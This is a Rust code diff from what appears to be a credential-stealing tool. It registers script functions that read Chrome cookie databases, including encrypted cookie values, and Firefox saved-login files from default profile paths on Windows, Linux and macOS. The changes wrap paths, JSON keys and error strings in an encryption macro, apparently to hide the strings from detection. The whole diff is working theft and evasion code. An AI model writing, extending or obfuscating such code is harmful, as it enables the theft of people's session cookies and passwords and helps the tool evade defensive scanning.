@@ -13,7 +13,7 @@ pub fn register(engine: &mut Engine) {
     // (Windows) or the linux-keyring AES path to recover plaintext cookies.
     engine.register_fn(&aes_str!("internal_chrome_cookies"), |profile_path: &str| -> String {
         let db_path = if !profile_path.is_empty() {
-            format!("{}/Cookies", profile_path.trim_end_matches('/'))
+            format!("{}{}", profile_path.trim_end_matches('/'), aes_str!("/Cookies"))
         } else {
             default_chrome_cookies_path()
         };
@@ -24,7 +24,7 @@ pub fn register(engine: &mut Engine) {
                 | rusqlite::OpenFlags::SQLITE_OPEN_NO_MUTEX,
         ) {
             Ok(c)  => c,
-            Err(e) => return format!("Error: {}", e),
+            Err(e) => return format!("{}{}", aes_str!("Error: "), e),
         };
 
         let mut stmt = match conn.prepare(
@@ -33,19 +33,19 @@ pub fn register(engine: &mut Engine) {
              FROM cookies ORDER BY host_key LIMIT 5000"),
         ) {
             Ok(s)  => s,
-            Err(e) => return format!("Error: {}", e),
+            Err(e) => return format!("{}{}", aes_str!("Error: "), e),
         };
 
         let rows: Vec<serde_json::Value> = stmt
             .query_map([], |row| {
                 Ok(serde_json::json!({
-                    "host":            row.get::<_, String>(0).unwrap_or_default(),
-                    "name":            row.get::<_, String>(1).unwrap_or_default(),
-                    "path":            row.get::<_, String>(2).unwrap_or_default(),
-                    "secure":          row.get::<_, bool>(3).unwrap_or(false),
-                    "expires_utc":     row.get::<_, i64>(4).unwrap_or(0),
-                    "value":           row.get::<_, String>(5).unwrap_or_default(),
-                    "encrypted_value": row.get::<_, String>(6).unwrap_or_default(),
+                    aes_str!("host").as_str():            row.get::<_, String>(0).unwrap_or_default(),
+                    aes_str!("name").as_str():            row.get::<_, String>(1).unwrap_or_default(),
+                    aes_str!("path").as_str():            row.get::<_, String>(2).unwrap_or_default(),
+                    aes_str!("secure").as_str():          row.get::<_, bool>(3).unwrap_or(false),
+                    aes_str!("expires_utc").as_str():     row.get::<_, i64>(4).unwrap_or(0),
+                    aes_str!("value").as_str():           row.get::<_, String>(5).unwrap_or_default(),
+                    aes_str!("encrypted_value").as_str(): row.get::<_, String>(6).unwrap_or_default(),
                 }))
             })
             .ok()
@@ -61,7 +61,7 @@ pub fn register(engine: &mut Engine) {
     // `firefox_decrypt` tool using the profile's key4.db + cert9.db.
     engine.register_fn(&aes_str!("internal_firefox_logins"), |profile_path: &str| -> String {
         let logins_file = if !profile_path.is_empty() {
-            format!("{}/logins.json", profile_path.trim_end_matches('/'))
+            format!("{}{}", profile_path.trim_end_matches('/'), aes_str!("/logins.json"))
         } else {
             find_firefox_logins()
         };
@@ -69,7 +69,7 @@ pub fn register(engine: &mut Engine) {
         if logins_file.is_empty() {
             return aes_str!("Error: logins.json not found — pass the profile directory explicitly");
         }
-        fs::read_to_string(&logins_file).unwrap_or_else(|e| format!("Error: {}", e))
+        fs::read_to_string(&logins_file).unwrap_or_else(|e| format!("{}{}", aes_str!("Error: "), e))
     });
 }
 
@@ -80,24 +80,15 @@ pub fn register(engine: &mut Engine) {
 fn default_chrome_cookies_path() -> String {
     #[cfg(target_os = "windows")]
     {
-        format!(
-            "{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
-            std::env::var(aes_str!("USERPROFILE")).unwrap_or_default()
-        )
+        format!("{}{}", std::env::var(aes_str!("USERPROFILE")).unwrap_or_default(), aes_str!("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"))
     }
     #[cfg(target_os = "linux")]
     {
-        format!(
-            "{}/.config/google-chrome/Default/Cookies",
-            std::env::var(aes_str!("HOME")).unwrap_or_default()
-        )
+        format!("{}{}", std::env::var(aes_str!("HOME")).unwrap_or_default(), aes_str!("/.config/google-chrome/Default/Cookies"))
     }
     #[cfg(target_os = "macos")]
     {
-        format!(
-            "{}/Library/Application Support/Google/Chrome/Default/Cookies",
-            std::env::var(aes_str!("HOME")).unwrap_or_default()
-        )
+        format!("{}{}", std::env::var(aes_str!("HOME")).unwrap_or_default(), aes_str!("/Library/Application Support/Google/Chrome/Default/Cookies"))
     }
     #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
     String::new()
@@ -105,15 +96,9 @@ fn default_chrome_cookies_path() -> String {
 
 fn find_firefox_logins() -> String {
     #[cfg(target_os = "windows")]
-    let base = format!(
-        "{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
-        std::env::var(aes_str!("APPDATA")).unwrap_or_default()
-    );
+    let base = format!("{}{}", std::env::var(aes_str!("APPDATA")).unwrap_or_default(), aes_str!("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"));
     #[cfg(not(target_os = "windows"))]
-    let base = format!(
-        "{}/.mozilla/firefox",
-        std::env::var(aes_str!("HOME")).unwrap_or_default()
-    );
+    let base = format!("{}{}", std::env::var(aes_str!("HOME")).unwrap_or_default(), aes_str!("/.mozilla/firefox"));
 
     fs::read_dir(&base)
         .ok()
